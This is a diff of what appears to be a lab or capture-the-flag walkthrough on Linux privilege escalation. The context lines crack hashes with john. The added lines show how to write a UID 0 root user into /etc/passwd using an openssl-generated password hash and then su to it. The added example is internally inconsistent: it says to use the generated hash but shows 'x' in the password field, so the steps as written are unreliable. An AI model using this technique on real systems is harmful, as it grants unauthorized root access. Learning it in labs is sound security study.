@@ -20,14 +20,37 @@ Then, john comes:
 ```
 john --wordlist=/path/to/wordlist.txt final.txt
 ```
-The other option would be to **add a new user** **that has root privileges** named ```lol```. This would help us circumvent the tedious process of password cracking. Below is an easy way to do it:
+The other option is **adding a new user** **that has root privileges** named ```lol```. This would help us circumvent the tedious process of password cracking. Below is an easy way to do it:
 
 
 We will need the hash value of the password we want the new user to have. This can be done quickly using the openssl tool on Kali Linux.
 ```
 openssl passwd -1 -salt lol <new password>
 ```
-Finally, we could ```su``` to him and gain root access.
+
+
+Take the generated hash and add a new user entry in `/etc/passwd`. For example:
+
+```ruby
+lol:x:0:0:root:/root:/bin/bash
+```
+
+
+Here:
+
+`0:0` means the user has UID=0 and GID=0, which grants root privileges.
+
+/root is set as the home directory.
+
+/bin/bash is the default shell.
+
+After that, you can switch to the new user with:
+
+```
+su lol
+```
+Enter the password you defined earlier, and you will have root access
+
 
 
 
